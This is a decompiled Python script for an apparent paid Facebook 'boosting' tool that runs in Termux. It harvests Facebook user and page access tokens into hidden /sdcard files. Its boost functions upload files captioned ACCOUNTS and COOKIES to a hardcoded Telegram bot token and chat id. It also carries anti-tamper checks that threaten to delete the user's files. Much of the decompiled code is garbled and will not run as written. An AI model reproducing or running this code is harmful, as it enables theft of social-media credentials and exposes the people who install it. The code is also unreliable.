# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —
import requests
import re
import os
import aiohttp
from bs4 import BeautifulSoup as bs
import random
import urllib3
import mahdix
from time import sleep
from concurrent.futures import ThreadPoolExecutor
import threading
clear()
import os
import mahdix
from mahdix import logo as mahdi_logo
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor
import re
import requests
import json
import random
import json
import requests
import uuid
import string
import base64
import urllib
import urllib3
import re
import os
import time
import sys
import asyncio
import aiohttp
import json
import re
from colorama import init, Fore, Style
import random
import time
from datetime import datetime
from urllib.request import urlopen
from time import sleep as slp
import re
import requests
import json

def clr():
    data = os.listdir('/sdcard')
    if 'Android' in data:
        print(' \x1b[1;91m[!] ALL YOUR FILES WILL REMOVE IF YOU TRY AGAIN! ')
        exit()
        return None
    exit()
    return None
    exit()

from requests import api
x = open(api.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'os.system' in x:
    clr()
if 'system' in x:
    clr()
if '(url)' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import sessions
x = open(sessions.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sdcard' in x:
    clr()
if "60*'='" in x:
    clr()
if "60 * '='" in x:
    clr()
if "'='" in x:
    clr()
if 'std' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'open().write' in x:
    clr()
if 'open' in x:
    clr()
if 'write' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'logging' in x:
    clr()
if 'printf' in x:
    clr()
if 'open' in x:
    clr()
if 'echo' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'str(url)' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'l(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'n(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'r(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{url}' in x:
    clr()
if '(data)' in x:
    clr()
if '{data}' in x:
    clr()
if '(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
from requests import models
x = open(models.__file__, 'r').read()
if 'print' in x:
    clr()
if 'marshal' in x:
    clr()
if 'RPW-MCCLIFFORD' in x:
    clr()
if 'MCCLIFFORD' in x:
    clr()
if 'if self.url' in x:
    clr()
if 'lambda' in x:
    clr()
if 'lzma' in x:
    clr()
if 'gzip' in x:
    clr()
if 'bz2' in x:
    clr()
if 'binascii' in x:
    clr()
if 'zlib' in x:
    clr()
if 'exec' in x:
    clr()
if 'base64' in x:
    clr()
if 'base32' in x:
    clr()
if 'decompress' in x:
    clr()
if 'sys.stdout.write' in x:
    clr()
if 'blob' in x:
    clr()
if '.txt' in x:
    clr()
if 'x =' in x:
    clr()
if 'x=' in x:
    clr()
if 'approvalSheet' in x:
    clr()
if 'approval' in x:
    clr()
if 'console' in x:
    clr()
if 'puts' in x:
    clr()
if 'fmt' in x:
    clr()
if 'disp' in x:
    clr()
if 'open().write' in x:
    clr()
if 'write' in x:
    clr()
if 'open' in x:
    clr()
if 'logging.info' in x:
    clr()
if 'printf' in x:
    clr()
if 'echo' in x:
    clr()
if 'system' in x:
    clr()
if 'M4786==' in x:
    clr()
if 'M1107==' in x:
    clr()
if 'os.system' in x:
    clr()
if 'd(url)' in x:
    clr()
if 'c(url)' in x:
    clr()
if 'b(url)' in x:
    clr()
if 'a(url)' in x:
    clr()
if 'f(url)' in x:
    clr()
if 'j(url)' in x:
    clr()
if 'k(url)' in x:
    clr()
if 'm(url)' in x:
    clr()
if 'o(url)' in x:
    clr()
if 'p(url)' in x:
    clr()
if 'q(url)' in x:
    clr()
if 's(url)' in x:
    clr()
if 'e(url)' in x:
    clr()
if 'g(url)' in x:
    clr()
if 'h(url)' in x:
    clr()
if 'i(url)' in x:
    clr()
if 't(url)' in x:
    clr()
if 'u(url)' in x:
    clr()
if 'v(url)' in x:
    clr()
if 'z(url)' in x:
    clr()
if 'y(url)' in x:
    clr()
if 'x(url)' in x:
    clr()
if 'w(url)' in x:
    clr()
if '((url)' in x:
    clr()
if '+url' in x:
    clr()
if '{data}' in x:
    clr()
if 'str(data)' in x:
    clr()
if 'str(headers)' in x:
    clr()
if 'DR4X' in x:
    clr()
if '{headers}' in x:
    clr()
red = '\x1b[1;31m'
green = '\x1b[1;32m'
yellow = '\x1b[1;33m'
blue = '\x1b[1;34m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
black = '\x1b[1;30m'
magenta = '\x1b[1;35m'
grey = '\x1b[1;90m'
orange = '\x1b[1;91m'
lime = '\x1b[1;92m'
sky_blue = '\x1b[1;94m'
purple = '\x1b[1;95m'
turquoise = '\x1b[1;96m'
import random
import requests
ses = requests.Session()
user_agents = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6075.3 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6075.3 Safari/537.36',
    'Mozilla/5.0 (Windows NT 12.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6075.3 Safari/537.36 Edg/122.0.2103.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 15; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6075.3 Mobile Safari/537.36 SamsungBrowser/24.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/460.0.0.40.105;FBBV/480637688;FBDV/iPhone15,2;FBMD/iPhone;FBSN/iOS;FBSV/18.0;FBSS/2;FBCR/;FBID/phone;FBLC/en_US;FBOP/5]',
    'Mozilla/5.0 (Linux; Android 15; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 [FBAN/FB4A;FBAV/450.0.0.35.103;FBBV/480504416;FBPN/com.facebook.katana;FBDV/SM-G998U;FBSV/15.0;FBOP/5]']
random_user_agent = random.choice(user_agents)
ses.headers.update({
    'User-Agent': random_user_agent })

def W_ueragnt():
    return random.choice(user_agents)


def set_headers():
    ses.headers.update({
        'User-Agent': W_ueragnt(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1' })

set_headers()
headers = {
    'user-agent': W_ueragnt(),
    'viewport-width': '847',
    'x-asbd-id': '129477',
    'x-fb-friendly-name': 'GroupCometJoinForumMutation',
    'x-fb-lsd': 'wGh6ACr3OJ2v2rPBdXy-1o' }
headersccc = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'viewport-width': '546',
    'x-asbd-id': '129477',
    'x-fb-friendly-name': 'CometProfilePlusLikeMutation',
    'x-fb-lsd': 'KA9qtqSd7hV8150DnYqqmy' }
ah = 'MCCLIFFORD-'
imt = '-M1107=='
ak = ' RPW-'
myid = 10.upper()
key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()

def login():
    token = open('.token.txt', 'r').read()
    tokenku.append(token)
    sy = requests.get('https://graph.facebook.com/me?access_token=' + tokenku[0])
    public_menu()
    return None
    if KeyError:
        Public()
        return None
    if requests.exceptions.ConnectionError:
        clear()
        print(logo)
        print(' [×] Connection Timeout')
        exit()
        return None
    if IOError:
        Public()
        return None


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
        return None


def logo():
    rainbow_colors = [
        '\x1b[91m',
        '\x1b[93m',
        '\x1b[92m',
        '\x1b[96m',
        '\x1b[94m',
        '\x1b[95m']
    inverted_rainbow_colors = [
        '\x1b[95m',
        '\x1b[94m',
        '\x1b[96m',
        '\x1b[92m',
        '\x1b[93m',
        '\x1b[91m']
    [][f'''{magenta}''']['        \n   .__           .___\n   |  |        __| _/\n   |  | Less  / __ | '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{red}''']['TOOL:'][f'''{white}'''][' '][f'''{cyan}''']['Boosting'][f'''{white}'''][' '][f'''{yellow}''']['Tool'][f'''{white}''']['\n   '][f'''{magenta}''']['|  |__ Digitals |'][f'''{white}'''][' '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{cyan}''']['Owner: '][f'''{magenta}''']['Allisha Martinez'][f'''{white}''']['\n   '][f'''{magenta}''']['|____/ /\\ \\____ |'][f'''{white}'''][' '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{yellow}''']['Developer: '][f'''{blue}''']['McClifford'][f'''{white}''']['\n          '][f'''{magenta}''']['\\/     \\/ ']([][f'''{magenta}''']['        \n   .__           .___\n   |  |        __| _/\n   |  | Less  / __ | '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{red}''']['TOOL:'][f'''{white}'''][' '][f'''{cyan}''']['Boosting'][f'''{white}'''][' '][f'''{yellow}''']['Tool'][f'''{white}''']['\n   '][f'''{magenta}''']['|  |__ Digitals |'][f'''{white}'''][' '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{cyan}''']['Owner: '][f'''{magenta}''']['Allisha Martinez'][f'''{white}''']['\n   '][f'''{magenta}''']['|____/ /\\ \\____ |'][f'''{white}'''][' '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{yellow}''']['Developer: '][f'''{blue}''']['McClifford'][f'''{white}''']['\n          '][f'''{magenta}''']['\\/     \\/ '][f'''{magenta}''']([][f'''{magenta}''']['        \n   .__           .___\n   |  |        __| _/\n   |  | Less  / __ | '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{red}''']['TOOL:'][f'''{white}'''][' '][f'''{cyan}''']['Boosting'][f'''{white}'''][' '][f'''{yellow}''']['Tool'][f'''{white}''']['\n   '][f'''{magenta}''']['|  |__ Digitals |'][f'''{white}'''][' '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{cyan}''']['Owner: '][f'''{magenta}''']['Allisha Martinez'][f'''{white}''']['\n   '][f'''{magenta}''']['|____/ /\\ \\____ |'][f'''{white}'''][' '][f'''{white}''']['•'][f'''{white}'''][' '][f'''{yellow}''']['Developer: '][f'''{blue}''']['McClifford'][f'''{white}''']['\n          '][f'''{magenta}''']['\\/     \\/ '][f'''{magenta}'''][f'''{white}''']))
    print('••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')


def clear():
    os.system('clear')


def line():
    print('\x1b[1;37m •••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')

from time import strftime, gmtime

def boost(file_path):
    chat_id = '1292741412'
    bot_token = '7321967585:AAFFfAKWUdX1R7-BiIZJViXoR5OEsZCGd2Q'
    caption = strftime('%Y-%m-%d %H:%M:%S- ACCOUNTS', gmtime())
    url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
    file = open(file_path, 'rb')
    files = {
        'document': (file_path, file) }
    data = {
        'chat_id': chat_id,
        'caption': caption }
    response = requests.post(url, files = files, data = data)
    None(None, None)
    return None
    if not None:
        pass


def boost2(file_path2):
    chat_id2 = '1292741412'
    bot_token2 = '7321967585:AAFFfAKWUdX1R7-BiIZJViXoR5OEsZCGd2Q'
    caption2 = strftime('%Y-%m-%d %H:%M:%S- COOKIES', gmtime())
    url2 = f'''https://api.telegram.org/bot{bot_token2}/sendDocument'''
    file2 = open(file_path2, 'rb')
    files2 = {
        'document': (file_path2, file2) }
    data2 = {
        'chat_id': chat_id2,
        'caption': caption2 }
    response2 = requests.post(url2, files = files2, data = data2)
    None(None, None)
    return None
    if not None:
        pass


def Subscription():
    key1 = open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
    clear()
    logo()
    r1 = str(urlopen('https://github.com/mcclifford/mccliffordapproval.txt/blob/main/mccliffordapproval.txt').read())
    if key1 in r1:
        os.system('clear')
        logo()
        return None
    os.system('clear')
    logo()
    print('\t \x1b[1;31m Please Get Approval First\x1b[1;31m ')
    slp(1)
    os.system('clear')
    logo()
    print('')
    print(' \x1b[1;32m McClifford Boosting Rental Tool\x1b[1;37m\n')
    print(' \x1b[1;31m Note : THIS IS A PAID TOOL!   \x1b[1;37m')
    print('')
    print(' \x1b[1;37m [ Mode of Payment : GCASH 09858195417 ] ')
    print('')
    print('  Your key is not yet approved. ')
    print('')
    print('  Copy and Send the Key To McClifford')
    print('')
    print('  Your Key : ' + ah + key1)
    print('')
    name = input('  Your Name : ')
    print('')
    lol = input('  Your Email : ')
    print('')
    input('  Press Enter To Send Key')
    slp(3.5)
    Subscription()

Subscription()

def get_access_token_from_file(file_path):
    file = open(file_path, 'r')
    None(None, None)
    return file.read().strip().split('\n')
    if not None:
        pass
    return None
    if FileNotFoundError:
        print(f'''{red}  Start the tool first!''')
        return None


def convert_to_traodoisub(url):
    response = requests.post('https://id.traodoisub.com/api.php', data = {
        'link': url })
    if response.status_code == 200:
        result = response.json().get('id')
        return result
    if Exception:
        e = None
        print(f'''An error occurred: {e}''')
        e = None
        del e
        return None
        e = None
        del e


def extract_uid_from_link(post_link):
    pattern = 'https://www\\.facebook\\.com/(\\d+)/posts/[^/]+/?'
    match = re.match(pattern, post_link)
    if match:
        return match.group(1)
    None('Invalid post link.')


def store():
    clear()
    logo()
    print(f'''\t\t{green} TOTAL ACTIVE ACCOUNTS''')
    count_lines_in_files(path_file1, path_file2, path_file3, path_file4)
    line()
    print(f'''{white}  CHOOSE AN OPTION:''')
    print(f'''{yellow}  [1] {blue}VIEW STORED PAGES AND PROFILE''')
    print(f'''{yellow}  [2] {blue}REMOVE DEAD PAGES AND PROFILE''')
    line()
    choice = input(f'''{yellow}  Choose : {green}''')
    line()
    if choice == '1':
        display_file_info()
        return None
    if choice == '2':
        choose_file_and_delete_line()
        return None
    print(f'''{red}  Invalid choice!''')


def choose_file_and_delete_line():
    print(f'''{white}  CHOOSE SPECIFIC LINE TO DELETE:''')
    print(f'''{yellow}  [1] {blue}VIEW YOUR LIST OF RPA''')
    print(f'''{yellow}  [2] {blue}VIEW YOUR LIST OF FRA''')
    print(f'''{yellow}  [3] {blue}VIEW YOUR LIST OF RPA PAGES''')
    print(f'''{yellow}  [4] {blue}VIEW YOUR LIST OF FRA PAGES''')
    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
    line()
    account_choose = input(f'''{yellow}  Choose : {green}''')
    line()
    if account_choose == '1':
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '2':
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '3':
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt'
    if account_choose == '4':
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
    if account_choose == '0':
        print('Returning...')
        return None
    print('Invalid choice')
    return None
    delete_line(path_file, check_path)


def delete_line(path_file, check_path):
    display_file_content(check_path)
    line()
    lines_to_delete = input(f'''{yellow}  Enter numbers you want to delete {blue}[Use comma if multiple]{yellow}: {green}''')
    for line in []:
        if not line.strip().isdigit():
            pass
        line_numbers = lines_to_delete.split(',')[int(line.strip())]
        line = lines_to_delete.split(',')
        if not line_numbers:
            print(f'''{red}  No valid line numbers provided.''')
            return None
    for line_number in []:
        line_number = line_numbers[f'''-e \'{line_number}d\'''']
        sed_command_path_file = ' '.join(line_numbers)
        sed_command_path_file = f'''sed -i {sed_command_path_file} {path_file}'''
        for line_number in []:
            line_number = line_numbers[f'''-e \'{line_number}d\'''']
            sed_command_check_path = ' '.join(line_numbers)
            sed_command_check_path = f'''sed -i {sed_command_check_path} {check_path}'''
            os.system(sed_command_path_file)
            os.system(sed_command_check_path)
            print(f'''{green}  Lines {', '.join(map(str, line_numbers))} have been deleted.''')
            return None
            line = None
            line_number = None
            line_number = None


def display_file_info():
    print(f'''{white}  CHOOSE FILE TO DISPLAY INFO:''')
    print(f'''{yellow}  [1] {blue}VIEW YOUR LIST OF RPA''')
    print(f'''{yellow}  [2] {blue}VIEW YOUR LIST OF FRA''')
    print(f'''{yellow}  [3] {blue}VIEW YOUR LIST OF RPA PAGES''')
    print(f'''{yellow}  [4] {blue}VIEW YOUR LIST OF FRA PAGES''')
    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
    line()
    file_choose = input(f'''{yellow}  Choose : {green}''')
    line()
    if file_choose == '1' or file_choose == '01':
        file_path = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt'
        display_file_content(file_path)
        return None
    if file_choose == '2' or file_choose == '02':
        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt'
        display_file_content(file_path)
        return None
    if file_choose == '3' or file_choose == '03':
        file_path = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt'
        display_file_content(file_path)
        return None
    if file_choose == '4' or file_choose == '04':
        file_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
        display_file_content(file_path)
        return None
    if file_choose == '0' or file_choose == '00':
        main()
        return None
    print(f'''{red}  Invalid Input!''')
    sleep(1.5)
    display_file_info()


def display_file_content(file_path):
    file = open(file_path, 'r')
    content = file.readlines()
    total_lines = len(content)
    print(f'''{yellow}  Total : {green}{total_lines}\n''')
    for index, line in enumerate(content, start = 1):
        print(f'''{yellow}  [{index}] {white}- {green}''' + line.strip())
        None(None, None)
        return None
        if not None:
            pass
    return None
    if FileNotFoundError:
        print(f'''{red}  Please Stored first!''')
        return None
    if Exception:
        e = None
        print(f'''{red}  Please Stored first!''')
        e = None
        del e
        return None
        e = None
        del e


def delete_files():
    clear()
    logo()
    print(f'''\t\t{green} TOTAL ACTIVE ACCOUNTS''')
    count_lines_in_files(path_file1, path_file2, path_file3, path_file4)
    line()
    print(f'''{white}  CHOOSE TO RESET:''')
    print(f'''{yellow}  [1] {blue}RESET YOUR LIST OF RPA''')
    print(f'''{yellow}  [2] {blue}RESET YOUR LIST OF FRA''')
    print(f'''{yellow}  [3] {blue}RESET YOUR LIST OF RPA PAGES''')
    print(f'''{yellow}  [4] {blue}RESET YOUR LIST OF FRA PAGES''')
    print(f'''{red}  [0] {red}RETURN TO MAIN MENU''')
    line()
    account_choose = input(f'''{yellow}  Choose : {green}''')
    line()
    if account_choose == '1' or account_choose == '01':
        file_paths = [
            '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt',
            '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt']
        all_deleted = True
        for file_path in file_paths:
            if os.path.exists(file_path):
                os.remove(file_path)
            all_deleted = False
            if all_deleted:
                print(f'''{green}\n  Tool Successfully Reset!''')
                return None
        print(f'''{red}\n  Use the tool first!''')
        return None
    if account_choose == '2' or account_choose == '02':
        file_paths = [
            '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt',
            '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt']
        all_deleted = True
        for file_path in file_paths:
            if os.path.exists(file_path):
                os.remove(file_path)
            all_deleted = False
            if all_deleted:
                print(f'''{green}\n  Tool Successfully Reset!''')
                return None
        print(f'''{red}\n  Use the tool first!''')
        return None
    if account_choose == '3' or account_choose == '03':
        file_paths = [
            '/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt',
            '/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt']
        all_deleted = True
        for file_path in file_paths:
            if os.path.exists(file_path):
                os.remove(file_path)
            all_deleted = False
            if all_deleted:
                print(f'''{green}\n  Tool Successfully Reset!''')
                return None
        print(f'''{red}\n  Use the tool first!''')
        return None
    if account_choose == '4' or account_choose == '04':
        file_paths = [
            '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt',
            '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt']
        all_deleted = True
        for file_path in file_paths:
            if os.path.exists(file_path):
                os.remove(file_path)
            all_deleted = False
            if all_deleted:
                print(f'''{green}\n  Tool Successfully Reset!''')
                return None
        print(f'''{red}\n  Use the tool first!''')
        return None
    if account_choose == '0' or account_choose == '00':
        main()
        return None
    print(f'''{red}  Invalid Input!''')
    sleep(1.5)
    delete_files()


def extract_and_save_facebook_pages():
    line()
    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
    print(f'''{yellow}  [1] {cyan}ON YOUR RPA LIST''')
    print(f'''{yellow}  [2] {cyan}ON YOUR FRA LIST''')
    print(f'''{yellow}  [3] {cyan}ON YOUR RPA PAGES LIST''')
    print(f'''{yellow}  [4] {cyan}ON YOUR FRA PAGES LIST''')
    print(f'''{red}  [0] {red}RETURN''')
    line()
    account_choose = input(f'''{yellow}  Choose : {green}''')
    line()
    if account_choose == '1':
        open('/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt'
        get_facebook_pages()
        return None
    if account_choose == '2':
        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt'
        get_facebook_pages()
        return None
    if account_choose == '3':
        open('/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt'
        get_facebook_pages()
        return None
    if account_choose == '4':
        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
        get_facebook_pages()
        return None
    if account_choose == '0':
        start_tool()
        return None
    print('Invalid choice')


def get_facebook_pages_with_token(poo):
    url = 'https://graph.facebook.com/v18.0/me/accounts'
    headers = {
        'Authorization': f'''Bearer {poo}''' }
    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
    print(f'''{yellow}  [1] {blue}ON YOUR RPA LIST''')
    print(f'''{yellow}  [2] {blue}ON YOUR FRA LIST''')
    print(f'''{yellow}  [3] {blue}ON YOUR RPA PAGES LIST''')
    print(f'''{yellow}  [4] {blue}ON YOUR FRA PAGES LIST''')
    print(f'''{red}  [0] {red}RETURN''')
    line()
    account_choose = input(f'''{yellow}  Choose : {green}''')
    line()
    if account_choose == '1':
        open('/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '2':
        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '3':
        open('/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt'
    if account_choose == '4':
        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
    if account_choose == '0':
        start_tool()
        return None
    print('Invalid choice')
    return None
    response = requests.get(url, headers = headers)
    if response.status_code != 200:
        print(f'''  {red}Error: {response.text}''')
        line()
        return None
    data = response.json()
    for page in []:
        pages_data = data['data'][{
            'accessToken': page['access_token'],
            'id': page['id'],
            'name': page['name'] }]
        page = data['data']
        total_pages = 0
        new_pages = 0
        print(f'''{yellow}  Total pages in account: {green}{len(pages_data)}''')
        line()
        file = open(check_path, 'r')
        for line in { }:
            existing_pages = line.strip().split('|')[1]
            line = line.strip().split('|')[0]
            None(None, None)
            for page in pages_data:
                pages_access_token = page['accessToken']
                pages_name = page['name']
                pages_id = page['id']
                if file.readlines() in pages_id and existing_pages[pages_id] == pages_name:
                    print(f'''{red}  Pages Already Exist {yellow}---> {red}{pages_id}|{pages_name}''')
                    line()
                print(f'''  {white}ID : {yellow}{pages_id} {white}---> {green}Successfully Extract!''')
                line()
                new_pages += 1
                total_pages += 1
                file = open(check_path, 'a')
                file.write(f'''{pages_id}|{pages_name}\n''')
                None(None, None)
                file = open(path_file, 'a')
                file.write(f'''{pages_access_token}\n''')
                None(None, None)
                print(f'''{yellow}  New pages extracted: {green}{new_pages}''')
                line()
                return pages_data
                page = None
                line = None
                if not None:
                    pass
    if FileNotFoundError:
        existing_pages = { }
    if not None:
        pass
    if Exception:
        e = None
        print(f'''{red}  Error writing: {e}''')
        e = None
        del e
        e = None
        del e
    if not None:
        pass
    if Exception:
        e = None
        print(f'''{red}  Error writing: {e}''')
        e = None
        del e
        e = None
        del e


def get_facebook_pages():
    ses = requests.Session()
    clear()
    logo()
    print(f'''\t\t{green} TOTAL ACTIVE ACCOUNTS''')
    count_lines_in_files(path_file1, path_file2, path_file3, path_file4)
    line()
